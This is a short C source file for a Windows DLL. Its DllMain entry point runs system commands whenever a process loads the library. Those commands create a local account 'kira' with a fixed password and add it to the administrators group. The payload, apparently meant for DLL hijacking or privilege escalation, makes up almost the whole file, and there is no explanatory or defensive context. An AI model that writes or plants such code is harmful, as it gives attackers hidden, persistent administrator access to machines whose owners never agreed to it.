#include <stdlib.h>
#include <windows.h> // for data types e.g. BOOl

BOOL APIENTRY DllMain(
HANDLE hModule, // Handle to DLL module
DWORD ul_reason_for_call, //reason for calling function
LPVOID lpReserved ) //reserved
{
	switch (ul_reason_for_call )
	{
		case DLL_PROCESS_ATTACH: //process loading DLL
		int i;
		i = system ("net user kira kira_pw /add");
		i = system ("net localgroup administrators kira /add");
		break;
		case DLL_THREAD_ATTACH: //process create new thread
		break;
		case DLL_THREAD_DETACH: //thread exists normally
		break;
		case DLL_PROCESS_DETACH: //process unloads DLL 
		break;
	}
	return TRUE;
}

